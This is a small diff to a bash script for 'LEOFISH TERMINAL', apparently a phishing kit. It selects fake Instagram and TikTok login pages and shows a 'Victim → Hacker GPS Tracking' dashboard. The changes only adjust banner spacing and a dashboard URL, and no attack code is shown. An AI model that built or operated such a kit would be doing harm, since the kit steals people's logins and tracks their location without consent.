@@ -34,8 +34,8 @@ show_banner() {
     fi
     echo -e "${NC}"
     echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║${YELLOW}               LEOFISH TERMINAL v1.1 + GPS           ${WHITE}║${NC}"
-    echo -e "${WHITE}║${GREEN}                  Victim → Hacker GPS Tracking        ${WHITE}║${NC}"
+    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.1 + GPS           ${WHITE}║${NC}"
+    echo -e "${WHITE}║${GREEN}                    Victim → Hacker GPS Tracking        ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
@@ -61,7 +61,7 @@ generate_campaign() {
         2) PLATFORM="instagram"; PAGE="instagramlogin.php" ;;
         3) PLATFORM="tiktok"; PAGE="tiktoklogin.php" ;;
         4) 
-          echo -e "${GREEN}🛰️ GPS DASHBOARD: ${CYAN}${APP_URL}/ps-dashbord.php${NC}"
+            echo -e "${GREEN}🛰️ GPS DASHBOARD: ${CYAN}${APP_URL}/gps.php${NC}"
             echo -e "${YELLOW}📍 Carte satellite live avec toutes positions GPS${NC}"
             read -rp "$(echo -e "${WHITE}Entrée pour continuer...${NC}")"
             return
